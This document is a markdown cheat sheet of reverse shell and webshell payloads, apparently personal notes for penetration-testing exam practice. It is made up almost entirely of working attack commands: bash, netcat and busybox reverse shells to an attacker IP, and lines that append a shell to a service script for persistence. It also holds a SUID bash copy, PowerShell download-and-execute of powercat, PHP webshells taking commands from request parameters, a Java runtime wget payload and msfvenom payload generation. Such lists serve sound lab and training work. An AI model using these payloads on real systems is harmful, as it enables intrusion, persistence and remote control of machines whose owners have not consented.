# *Linux*
### bash reverse
```shell
/bin/bash -c "bash -i >& /dev/tcp/KALI_IP/LPORT 0>&1"
```
### busybox reverse
```shell
busybox nc KALI_IP 443 -e sh

# https://eins.li/posts/oscp-secret-sauce/
```
### nc
```shell
/path/nc KALI_IP LPORT -e /bin/bash
```
## .sh script reverse
```shell
# bash
echo "bash -i >& /dev/tcp/KALI_IP/443 0>&" >> /path/to/service.sh
chmod +x /path/to/service.sh

# nc
echo >> reverse.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc KALI_IP 443 >/tmp/f" >> /path/to/service.sh
chmod +x /path/to/service.sh
```
## copy bash w/ suid
```shell
cp /bin/bash /tmp && chmod +s /tmp/bash
```

# ***Windows***
## powershell encoded
```shell
# 1 KALI
python3 ps_encode.py


# 2 TARGET
powershell.exe -nop -w hidden -enc encoded_payload...
```
## powercat encoded
```shell
# 1 KALI
python3 cat_encode.py


# 2 TARGET
powershell.exe -nop -w hidden -enc encoded_payload...
```
## powercat manually typed
```shell
# 1 Payload
IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP/resources/powercat.ps1');powercat -c KALI_IP -p 443 -e powershell


# 2 Use as follows
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP/resources/powercat.ps1');powercat -c KALI_IP -p 443 -e powershell"
```
## nc.exe
```shell
C:\PATH\nc.exe KALI_IP LPORT -e powershell
```

# ***Web***
## php
### bash reverse
```php
<?php exec("/bin/bash -c bash -i >& /dev/tcp/KALI_IP/443 0>&1"); ?>
```
### simple webshell
```php
<?php echo system($_GET['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
```
### simple webshell 2
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
    }
?>
# located at /usr/share/webshells/php/simple-backdoor.php
```
### sincek reverse
```shell
# https://github.com/ivan-sincek/php-reverse-shell
```
### wordpress plugin
```shell
# POST
curl -X POST `tip`:`WPORT`/wordpress/wp-content/plugins/wp_webshell/wp_webshell.php --data 'action=exec&cmd=id'

# GET (or use browser)
curl `tip`:`WPORT`/wordpress/wp-content/plugins/wp_webshell/wp_webshell.php?action=exec&cmd=id

# https://github.com/p0dalirius/Wordpress-webshell-plugin
```
### wordpress plugin 2
```shell
https://github.com/wetw0rk/malicious-wordpress-plugin
```
## asp
### webshell
```shell
https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/webshell
```

## java
### runtime exec
```shell
${script:javascript:java.lang.Runtime.getRuntime().exec("wget http://KALI_IP/reverse -O /tmp/reverse")}
```

# *MSFVenom*
Check [Infinite Logins](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)for help with below 4

## windows reverse
```shell
msfvenom -p windows/shell_reverse_tcp lhost=`mip` lport=443 -f exe > reverse.exe
```

## linux reverse
```shell
msfvenom -p linux/x64/shell_reverse_tcp lhost=`mip` lport=443 -f elf > reverse.elf
```
## php reverse
```shell
msfvenom -p php/reverse_php lhost=`mip` lport=443 -f raw > reverse.php
```
## asp reverse
```shell
msfvenom -p windows/shell/reverse_tcp lhost=`mip` lport=443 -f asp > reverse.asp
```

# ***upgrade shell***
```shell
# 1 TARGET
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
^z


# 2 KALI
stty raw -echo;fg
```